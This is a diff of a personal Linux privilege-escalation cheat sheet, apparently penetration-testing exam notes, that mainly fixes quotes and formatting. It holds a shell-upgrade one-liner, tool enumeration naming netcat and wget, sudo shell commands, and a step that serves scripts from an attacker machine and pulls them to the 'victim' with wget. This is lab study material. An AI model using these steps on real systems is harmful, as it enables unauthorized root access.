@@ -9,15 +9,15 @@ Authors: Daniel Haggerty
 
 ```
 privesc_linux
-UPGRADE SHELL python -c ‘import pty; pty.spawn("bin/bash")’
+UPGRADE SHELL python -c 'import pty; pty.spawn("bin/bash")'
 ctrl-Z
 stty raw -echo
 fg
 ```
 Enumerate and run this:
-```
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
-```
+
+`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
+
 If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
@@ -30,11 +30,14 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)
+
+
 ```
 sudo -u anotheruser command run sommand as another user
 sudo -u scriptmanager bash -i #run shell as user scriptmanager
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2>/dev/null
 ```
+
 DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
